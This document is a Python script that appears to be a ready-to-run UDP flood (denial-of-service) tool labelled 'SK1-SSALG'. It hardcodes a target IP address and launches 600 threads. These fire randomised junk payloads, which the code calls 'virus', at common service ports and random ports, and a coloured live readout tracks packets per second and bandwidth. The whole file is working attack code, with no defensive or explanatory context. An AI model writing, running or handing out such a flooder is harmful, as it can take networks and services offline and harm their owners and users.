import socket
import threading
import time
import random
import struct

TARGET_IP = "62.109.121.42"  # YOUR ROUTER

# ==================== OPTIMIZED VIRUS GENERATION ====================
def gen_max_virus(size):
    """Generate maximum damage virus for specific size"""
    patterns = [
        b'\xFF' * size,
        b'\x00' * size,  
        b'\xAA\x55' * (size // 2),
        random.randbytes(size),
        bytes([i % 256 for i in range(size)]),
    ]
    return random.choice(patterns)

# ==================== THREAD CONFIG ====================
UDP_RAPID_PPS = 150
UDP_PPS = 150
UDP_RAPID_BW = 150  
UDP_BW = 150
TOTAL_THREADS = 600

# Global counters
total_packets = 0
total_bytes = 0

# ==================== OPTIMIZED SOCKET MANAGEMENT ====================
class SocketManager:
    def __init__(self):
        self.udp_sockets = []
        self.init_sockets()
    
    def init_sockets(self):
        for _ in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.udp_sockets.append(sock)
            except:
                pass
    
    def get_socket(self, thread_id):
        return self.udp_sockets[thread_id % len(self.udp_sockets)]

socket_mgr = SocketManager()

# ==================== OPTIMIZED ATTACK THREADS ====================
def optimized_rapid_pps(thread_id):
    global total_packets, total_bytes
    sock = socket_mgr.get_socket(thread_id)
    ports = [53, 80, 443, 123, 161, 1900]
    
    while True:
        try:
            for _ in range(40):
                virus = gen_max_virus(64)
                for port in ports:
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += 64
                port = random.randint(1, 65535)
                sock.sendto(virus, (TARGET_IP, port))
                total_packets += 1
                total_bytes += 64
        except:
            pass

def optimized_pps(thread_id):
    global total_packets, total_bytes
    sock = socket_mgr.get_socket(thread_id + 100)
    
    while True:
        try:
            for _ in range(25):
                size = random.choice([128, 192, 256])
                virus = gen_max_virus(size)
                for _ in range(8):
                    port = random.choice([80, 443, 8080, 8443, 7547, 22, 21, 25])
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += size
        except:
            pass

def optimized_rapid_bw(thread_id):
    global total_packets, total_bytes
    sock = socket_mgr.get_socket(thread_id + 200)
    bw_ports = [80, 443, 8080, 8443]
    
    while True:
        try:
            for _ in range(15):
                size = random.choice([512, 768, 1024])
                virus = gen_max_virus(size)
                for port in bw_ports:
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += size
                if random.random() < 0.3:
                    big_virus = gen_max_virus(1472)
                    sock.sendto(big_virus, (TARGET_IP, random.choice(bw_ports)))
                    total_packets += 1
                    total_bytes += 1472
        except:
            pass

def optimized_bandwidth(thread_id):
    global total_packets, total_bytes
    sock = socket_mgr.get_socket(thread_id + 300)
    
    while True:
        try:
            for _ in range(10):
                size = random.choice([1024, 1280, 1472])
                virus = gen_max_virus(size)
                for _ in range(6):
                    port = random.randint(1, 65535)
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += size
                if random.random() < 0.4:
                    sock.sendto(virus, (TARGET_IP, random.randint(1, 65535)))
                    total_packets += 1
                    total_bytes += size
        except:
            pass

# ==================== LAUNCH THREADS ====================
print("SK1-SSALG | OPTIMIZED EFFICIENCY | 600 THREADS")

for i in range(UDP_RAPID_PPS):
    t = threading.Thread(target=optimized_rapid_pps, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_PPS):
    t = threading.Thread(target=optimized_pps, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_RAPID_BW):
    t = threading.Thread(target=optimized_rapid_bw, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_BW):
    t = threading.Thread(target=optimized_bandwidth, args=(i,))
    t.daemon = True
    t.start()

# ==================== COLORED LOGGING ====================
YELLOW = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

last_log = time.time()
peak_pps = 0
peak_bw = 0

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate
    pps = int(total_packets / elapsed) if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    
    # Track peaks
    if pps > peak_pps:
        peak_pps = pps
    if mbps > peak_bw:
        peak_bw = mbps
    
    # Reset
    total_packets = 0
    total_bytes = 0
    
    # Color selection
    # SK1-SSALG = yellow
    sk1_color = YELLOW
    
    # PPS = green_to_yellow
    if pps >= 50000:
        pps_color = GREEN
    else:
        pps_color = YELLOW
    
    # Bandwidth = above 100 green_to_yellow, under 100 yellow_to_red
    if mbps >= 100:
        if mbps >= 150:
            bw_color = GREEN
        else:
            bw_color = YELLOW
    else:
        if mbps >= 50:
            bw_color = YELLOW
        else:
            bw_color = RED
    
    # Display with colors
    print(f"{sk1_color}SK1-SSALG{RESET} | {pps_color}{pps:,}{RESET}/s | {bw_color}{mbps:.1f}{RESET}Mbps")
    
    # Show efficiency info every 5 seconds
    if int(current) % 5 == 0:
        efficiency = mbps / max(pps, 1) * 1000
        print(f"{YELLOW}   EFF: {efficiency:.1f}B/pkt | PEAK: {peak_pps:,}/s {peak_bw:.1f}Mbps{RESET}")
